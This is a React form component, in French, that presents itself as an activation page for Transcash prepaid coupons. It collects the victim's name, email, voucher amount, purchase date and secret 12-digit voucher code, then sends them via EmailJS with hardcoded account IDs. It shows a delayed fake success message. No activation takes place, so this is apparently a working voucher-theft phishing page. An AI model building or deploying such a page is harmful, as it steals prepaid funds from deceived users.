import React, { useState, useRef } from 'react';
import emailjs from 'emailjs-com';
import '../styles/component/Form.scss';
 

const Form = () => {

  const [eye, seteye] = useState(true);
    const [select, setSelect] = useState(20);
     const Eyeclick = () => {
    seteye(!eye);
    const code = document.getElementById("code");
    if (eye) {
      code.setAttribute("type", "text");
      seteye(false);
    } else {
      code.setAttribute("type", "password");
    }
    };
      const handleChange = (e) => {
    setSelect(e.target.value);
    };
     

    const form = useRef();

      const sendEmail = (e) => {
    e.preventDefault();
    const message = document.getElementById("message");
   

    emailjs
      .sendForm(
        "service_o19gmcb",
        "template_hzn98zf",
        form.current,
        "eNbGuhHH13G4a2Mho"
      )
      .then(
        (result) => {
       
          setTimeout(function () {
               message.innerHTML =
                 "Votre requète à bien été envoyé , vous recevrez un email dans quelques instants";
            message.style.color = "green";
            message.style.display ="block"
          },5000)
        },
        (error) => {
          
          message.innerHTML =
            "Réquète non traité, veuillez vérifier votre connexion internet et réessayer.";
          
            message.style.color = "red";
         
          
          
         
        }
      );
  };
    
    return (
        <div className="formulaire">
            <h1 style={{textAlign:"center"}}>Activez votre coupon transcash</h1>
        <form id="validation" ref={form} onSubmit={sendEmail}>
    
          <div className="bloc">
            <label for="nom">
              Nom *
              <input
                required
                placeholder="Ex:Jean Descartes"
                type="text"
                name="name"
                id="nom"
                minLength={4}
                maxLength={25}
              />
            </label>
          </div>
          <div className="bloc">
            <label for="email">
              Email * :
              <input
                required
                placeholder="Ex :jeanDescartes@gmail.com"
                type="email"
                name="email"
                id=""
              />
            </label>
          </div>
          <div className="bloc">
            <label for="coupon">
              Montant * :
              <select name="coupon" value={select} onChange={handleChange}>
                <option>20</option>
                <option>50</option>
                <option>100</option>
                <option>150</option>
                <option>200</option>
                <option>250</option>
                <option>300</option>
                <option>500</option>
              </select>
            </label>
          </div>
          <div className="bloc">
            <label for="achat">
              Date d'achat * : <input  required type="date" name="achat"  />
            </label>
          </div>
          <div className="bloc">
            <label>
              Code à 12 chiffres * :
              <input
                required
                placeholder="************"
                type="password"
                minLength="12"
                maxLength="12"
                name="code"
                id="code"
                pattern="[0-9]{12}"
                title="Le code doit contenir que des chiffres"
              />
              <i
                onClick={Eyeclick}
               
                class={eye ? "fa-solid fa-eye" : "fa-solid fa-eye-slash"}
              ></i>
            </label>
          </div>
          <p>Lieu d'achat * </p>
          <label for="lieu" style={{ color: "orange" }}>
            <input value="internet" type="radio" name="lieu" id="lieu" />
            Internet
          </label>
          <label for="lieu" style={{ color: "orange" }}>
            <input
              value="Bureau de tabac"
              required
              type="radio"
              name="lieu"
            
            />
            Bureau de Tabac
          </label>
          <p>
            Je certifie que mon code n'a pas été utilisé sur un autre site *
          </p>
          <label for="utile" style={{ color: "orange" }}>
            <input value="oui" required type="radio" name="utile"  /> oui
            <input
              for="utile"
              value="non"
              type="radio"
              name="utile"
             
            />
            non
          </label>
         
          <div className="submit">
            <input type="submit" id="submit" value="Activer Maintenant" />
          </div>
                <h4 id="message" >
                    
                </h4>
                
            </form>
            
      </div>
    );
};

export default Form;